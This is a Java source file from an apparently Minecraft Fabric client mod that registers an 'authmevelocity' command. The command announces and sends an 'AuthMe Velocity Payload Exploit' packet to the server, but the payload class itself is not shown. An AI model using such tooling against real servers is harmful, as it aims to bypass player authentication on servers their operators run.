package dev.wrrulosdev.mcpclient.client.commands.cmd;

import dev.wrrulosdev.mcpclient.client.commands.Command;
import dev.wrrulosdev.mcpclient.client.constants.ClientConstants;
import dev.wrrulosdev.mcpclient.client.payloads.AuthMeVelocityPayloadPacket;
import dev.wrrulosdev.mcpclient.client.utils.messages.Msg;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import static net.fabricmc.fabric.api.client.command.v2.ClientCommandManager.literal;

public class AuthMeVelocityExploitCommand implements Command {

    /**
     * Registers the authmevelocity command.
     *
     * @return A LiteralArgumentBuilder that configures the "plugins" command.
     */
    @Override
    public LiteralArgumentBuilder<FabricClientCommandSource> register() {
        return literal("authmevelocity")
            .executes(this::executeAuthMeVelocity);

    }

    /**
     *
     * @param context The command context, containing information about the player running the command.
     * @return The result of the command execution (0 indicates success).
     */
    private int executeAuthMeVelocity(CommandContext<FabricClientCommandSource> context) {
        Msg.sendFormattedMessage(ClientConstants.PREFIX + "&aSending the &fAuthMe Velocity &aPayload Exploit to the server...");
        AuthMeVelocityPayloadPacket.send();
        return 0;
    }
}
